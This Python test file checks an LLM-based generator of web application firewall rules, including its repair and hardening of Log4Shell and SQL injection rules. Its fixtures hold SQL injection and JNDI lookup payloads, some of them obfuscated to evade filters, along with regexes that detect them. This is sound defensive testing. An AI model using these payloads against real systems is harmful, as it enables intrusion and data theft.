from __future__ import annotations

import subprocess

from waf_factory.agents import RuleGeneratorAgent
from waf_factory.models import Condition, CveIntel, EnforcementMode, FieldType, IntermediateRule, Operator, PocArtifact, Severity


def _sample_intel() -> CveIntel:
    return CveIntel(
        cve_id="CVE-2026-0001",
        description="SQL injection in login endpoint",
        severity=Severity.HIGH,
        tags=["sqli"],
    )


def _sample_pocs() -> list[PocArtifact]:
    return [
        PocArtifact(
            cve_id="CVE-2026-0001",
            source="nuclei-templates:test-template.yaml",
            payload="username=admin' UNION SELECT password FROM users--",
        )
    ]


def test_rule_generator_fallback_when_llm_missing_key(monkeypatch) -> None:
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    monkeypatch.setenv("WAF_LLM_PROVIDER", "github")

    def fake_run(*args, **kwargs):
        return subprocess.CompletedProcess(args=args, returncode=1, stdout="", stderr="not logged in")

    monkeypatch.setattr("waf_factory.llm_rulegen.subprocess.run", fake_run)

    agent = RuleGeneratorAgent()
    rules, warnings = agent.generate(
        intel=_sample_intel(),
        pocs=_sample_pocs(),
        mode=EnforcementMode.COUNT,
        use_llm=True,
    )

    assert rules == []
    assert any("gh auth login" in warning for warning in warnings)
    assert not any("Heuristic fallback" in warning for warning in warnings)


def test_rule_generator_returns_empty_when_llm_disabled() -> None:
    agent = RuleGeneratorAgent()
    rules, warnings = agent.generate(
        intel=_sample_intel(),
        pocs=_sample_pocs(),
        mode=EnforcementMode.COUNT,
        use_llm=False,
    )

    assert rules == []
    assert warnings == ["Rule generation skipped: heuristic fallback has been removed and use_llm is false"]


def test_rule_generator_returns_empty_when_llm_missing_key(monkeypatch) -> None:
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    monkeypatch.setenv("WAF_LLM_PROVIDER", "github")

    def fake_run(*args, **kwargs):
        return subprocess.CompletedProcess(args=args, returncode=1, stdout="", stderr="not logged in")

    monkeypatch.setattr("waf_factory.llm_rulegen.subprocess.run", fake_run)

    agent = RuleGeneratorAgent()
    rules, warnings = agent.generate(
        intel=_sample_intel(),
        pocs=_sample_pocs(),
        mode=EnforcementMode.COUNT,
        use_llm=True,
    )

    assert rules == []
    assert any("gh auth login" in warning for warning in warnings)


def test_rule_generator_repairs_missing_header_coverage() -> None:
    class _ScriptedAgent(RuleGeneratorAgent):
        def __init__(self) -> None:
            super().__init__()
            self.calls = 0

        def _generate_with_llm(self, intel, pocs, mode, repair_feedback=None):
            self.calls += 1
            base = {
                "rule_id": f"{intel.cve_id.lower()}-llm",
                "name": "test",
                "cve_id": intel.cve_id,
                "severity": intel.severity,
                "action": mode,
                "confidence": 0.8,
                "source_pocs": [p.payload for p in pocs],
                "provenance": {"generator": "llm"},
            }
            if self.calls == 1:
                return IntermediateRule(
                    **base,
                    conditions=[
                        Condition(field_type=FieldType.QUERY, operator=Operator.REGEX, pattern=r"\$\{jndi:ldap://")
                    ],
                ), []
            return IntermediateRule(
                **base,
                conditions=[
                    Condition(field_type=FieldType.QUERY, operator=Operator.REGEX, pattern=r"\$\{jndi:ldap://"),
                    Condition(
                        field_type=FieldType.HEADER,
                        operator=Operator.REGEX,
                        header_name="User-Agent",
                        pattern=r"\$\{jndi:ldap://",
                    ),
                ],
            ), []

    agent = _ScriptedAgent()
    pocs = [
        PocArtifact(
            cve_id="CVE-2021-44228",
            source="nuclei-templates:http/cves/2021/CVE-2021-44228.yaml",
            payload="GET /?x=${jndi:ldap://x} HTTP/1.1",
        ),
        PocArtifact(
            cve_id="CVE-2021-44228",
            source="nuclei-templates:http/cves/2021/CVE-2021-44228.yaml",
            payload="User-Agent: ${jndi:ldap://x}",
        ),
    ]
    rules, warnings = agent.generate(
        intel=CveIntel(cve_id="CVE-2021-44228", severity=Severity.CRITICAL),
        pocs=pocs,
        mode=EnforcementMode.COUNT,
        use_llm=True,
    )

    assert len(rules) == 1
    assert any(cond.field_type == FieldType.HEADER for cond in rules[0].conditions)
    assert agent.calls == 2
    assert any("coverage" in warning.lower() for warning in warnings)


def test_rule_generator_enforces_family_surface_symmetry_when_llm_stays_asymmetric() -> None:
    class _AsymmetricAgent(RuleGeneratorAgent):
        def __init__(self) -> None:
            super().__init__()
            self.calls = 0

        def _generate_with_llm(self, intel, pocs, mode, repair_feedback=None):
            self.calls += 1
            # Deliberately returns only query coverage for a JNDI family even after repair.
            return IntermediateRule(
                rule_id=f"{intel.cve_id.lower()}-llm",
                name="test",
                cve_id=intel.cve_id,
                severity=intel.severity,
                action=mode,
                confidence=0.8,
                conditions=[
                    Condition(
                        field_type=FieldType.QUERY,
                        operator=Operator.REGEX,
                        pattern=r"\$\{[^}]{0,20}j[^}]{0,10}n[^}]{0,10}d[^}]{0,10}i[^}]{0,50}:(ldap|ldaps|rmi|dns)://",
                    )
                ],
                source_pocs=[p.payload for p in pocs],
                provenance={"generator": "llm"},
            ), []

    agent = _AsymmetricAgent()
    pocs = [
        PocArtifact(
            cve_id="CVE-2026-9000",
            source="nuclei-templates:test.yaml",
            payload="GET /api/${jndi:ldap://x}/v1?q=${jndi:ldap://x} HTTP/1.1",
        ),
        PocArtifact(
            cve_id="CVE-2026-9000",
            source="nuclei-templates:test.yaml",
            payload="User-Agent: ${${lower:j}ndi:ldap://x}",
        ),
    ]

    rules, warnings = agent.generate(
        intel=CveIntel(cve_id="CVE-2026-9000", severity=Severity.CRITICAL),
        pocs=pocs,
        mode=EnforcementMode.COUNT,
        use_llm=True,
    )

    assert len(rules) == 1
    surfaces = {cond.field_type for cond in rules[0].conditions}
    assert {FieldType.URI_PATH, FieldType.QUERY, FieldType.BODY, FieldType.HEADER} <= surfaces
    assert agent.calls == 2
    assert any(
        token in warning.lower()
        for token in ["symmetry", "hardening"]
        for warning in warnings
    )


def test_rule_generator_backfills_obfuscation_families_when_llm_is_naive() -> None:
    class _NaiveOnlyAgent(RuleGeneratorAgent):
        def __init__(self) -> None:
            super().__init__()
            self.calls = 0

        def _generate_with_llm(self, intel, pocs, mode, repair_feedback=None):
            self.calls += 1
            return IntermediateRule(
                rule_id=f"{intel.cve_id.lower()}-llm",
                name="test",
                cve_id=intel.cve_id,
                severity=intel.severity,
                action=mode,
                confidence=0.8,
                conditions=[
                    Condition(field_type=FieldType.QUERY, operator=Operator.REGEX, pattern=r"(?i)\$\{ctx:http://")
                ],
                source_pocs=[p.payload for p in pocs],
                provenance={"generator": "llm"},
            ), []

    agent = _NaiveOnlyAgent()
    pocs = [
        PocArtifact(
            cve_id="CVE-2021-44228",
            source="nuclei-templates:test.yaml",
            payload="GET /api/${${::-c}${::-t}${::-x}:http://x}?q=${ctx:http://x} HTTP/1.1",
        ),
        PocArtifact(
            cve_id="CVE-2021-44228",
            source="nuclei-templates:test.yaml",
            payload="User-Agent: ${env:FOO:-${ctx:http://x}}",
        ),
        PocArtifact(
            cve_id="CVE-2021-44228",
            source="nuclei-templates:test.yaml",
            payload="username=${ctx:${lower:h}${lower:t}tp://x}",
        ),
    ]

    rules, warnings = agent.generate(
        intel=CveIntel(cve_id="CVE-2021-44228", severity=Severity.CRITICAL),
        pocs=pocs,
        mode=EnforcementMode.COUNT,
        use_llm=True,
    )

    assert len(rules) == 1
    patterns = [c.pattern for c in rules[0].conditions]
    assert any("(lower|upper|::-)" in p for p in patterns)
    assert any(":-" in p for p in patterns)
    assert any("c[^}]{0,10}t[^}]{0,10}x" in p for p in patterns)
    assert any("hardening" in warning.lower() for warning in warnings)
